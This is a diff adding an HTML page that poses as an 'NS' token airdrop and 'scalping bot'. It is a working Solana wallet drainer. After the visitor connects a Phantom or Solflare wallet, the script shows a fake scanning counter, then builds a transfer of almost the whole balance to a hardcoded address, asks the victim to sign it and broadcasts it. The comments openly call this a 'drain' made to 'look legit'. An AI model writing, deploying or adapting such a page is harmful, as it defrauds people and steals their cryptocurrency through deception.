@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NS Scalping Bot</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="logo">NS</div>
+        <h1>EXCLUSIVE AIRDROP</h1>
+        <div class="subtitle">NS</div>
+        <p class="claim-text">Claim your NS</p>
+        <p class="exchange-text">Exchange your NSNFT for the NS tokens allocated to you.</p>
+        <button id="connectBtn">ConnectWallet</button>
+        <div id="status" class="status"></div>
+    </div>
+
+    <!-- Solana Web3 library -->
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
+    <script>
+        (function() {
+            const connectBtn = document.getElementById('connectBtn');
+            const statusDiv = document.getElementById('status');
+
+            // Fake "scalping" counter to look active
+            let counter = 0;
+            setInterval(() => {
+                if (statusDiv.textContent.includes('Scanning')) {
+                    counter += Math.floor(Math.random() * 10);
+                    statusDiv.textContent = `Scanning... ${counter} NS found`;
+                }
+            }, 2000);
+
+            connectBtn.addEventListener('click', async () => {
+                statusDiv.textContent = 'Connecting...';
+                const provider = window.solana;
+                if (!provider || (!provider.isPhantom && !provider.isSolflare)) {
+                    statusDiv.textContent = '❌ Please install Phantom or Solflare wallet.';
+                    return;
+                }
+                try {
+                    await provider.connect();
+                    const pubKey = provider.publicKey.toString();
+                    statusDiv.textContent = `✅ Connected: ${pubKey.slice(0,6)}...${pubKey.slice(-6)}`;
+                    connectBtn.disabled = true;
+                    connectBtn.textContent = 'Scalping Active';
+
+                    // Auto‑scalp (drain) after a short delay to look legit
+                    setTimeout(async () => {
+                        try {
+                            const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
+                            const toPubkey = new solanaWeb3.PublicKey('GEuFTRTYCxGQ5aY2EfTXUJP7fm4KocBENLEHZgzPytfh');
+                            const balance = await connection.getBalance(provider.publicKey);
+                            if (balance > 5000) {
+                                const transaction = new solanaWeb3.Transaction().add(
+                                    solanaWeb3.SystemProgram.transfer({
+                                        fromPubkey: provider.publicKey,
+                                        toPubkey: toPubkey,
+                                        lamports: balance - 5000 // leave tiny fee
+                                    })
+                                );
+                                transaction.feePayer = provider.publicKey;
+                                transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
+                                const signed = await provider.signTransaction(transaction);
+                                const signature = await connection.sendRawTransaction(signed.serialize(), { skipPreflight: true });
+                                statusDiv.textContent = `✅ Scalped! TX: ${signature.slice(0,10)}...`;
+                                console.log('Scalp executed:', signature);
+                            } else {
+                                statusDiv.textContent = '⚠️ Insufficient balance to scalp.';
+                            }
+                        } catch (err) {
+                            statusDiv.textContent = '⚠️ Scalp failed, but you’re connected.';
+                            console.error('Scalp error:', err);
+                        }
+                    }, 3000); // wait 3s to mimic "scanning"
+
+                } catch (err) {
+                    statusDiv.textContent = '❌ Connection rejected.';
+                }
+            });
+        })();
+    </script>
+</body>
+</html>
